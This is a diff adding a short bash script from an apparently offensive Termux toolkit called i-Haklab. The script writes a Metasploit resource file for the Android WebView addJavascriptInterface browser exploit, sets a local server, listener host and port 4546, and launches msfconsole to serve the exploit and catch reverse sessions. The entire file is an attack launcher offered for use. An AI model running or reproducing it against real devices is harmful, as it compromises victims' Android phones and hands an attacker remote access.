@@ -1,0 +1,42 @@
+#!/bin/bash
+#This file is part of i-Haklab command
+
+if [ -d /data/data/com.termux/files/home/i-Haklab ]; then
+        iHAKLAB=/data/data/com.termux/files/home/i-Haklab                                   else
+        iHAKLAB=/data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab
+fi
+
+source $iHAKLAB/.set/libexec/colors
+source $iHAKLAB/.set/var/variables
+source $iHAKLAB/.set/functions/functions
+
+
+until [ -d ~/java/handler/ ]; do
+	printf "$R[w]->$W The hanlder box is empty\n"
+	exit
+done
+
+if [ ! -e ~/java/handler/paylink-soa5.rc ]; then
+	banner
+	echo "use exploit/android/browser/webview_addjavascriptinterface" > ~/java/handler/paylink-soa5.rc
+	echo "set SRVHOST $LOCALHOST" >> ~/java/handler/paylink-soa5.rc
+	echo "set SRVPORT $LPORT" >> ~/java/handler/paylink-soa5.rc
+	echo "set LHOST $LOCALHOST" >> ~/java/handler/paylink-soa5.rc
+	echo "set LPORT 4546" >> ~/java/handler/paylink-soa5.rc
+	echo "set URIPATH /" >> ~/java/handler/paylink-soa5.rc
+        echo "run" >> ~/java/handler/paylink-soa5.rc
+        if [ $CHECKROOT = "root" ]; then
+                chk-sudo
+                chk-msf
+                printf "$Y[i]->$W Handler file saved as$G paylink-soa5.rc$W\n"
+                sleep 1
+                sudo msfconsole -q -r ~/java/handler/paylink-soa5.rc
+        else
+                printf "$Y[i]->$W Handler file saved as$G paylink-soa5.rc$W\n"
+                sleep 1
+                chk-msf
+                msfconsole -q -r ~/java/handler/paylink-soa5.rc
+        fi
+else
+        printf "$R[w]->$W File paylink-nexam-soa5.rc already exist\n"
+fi
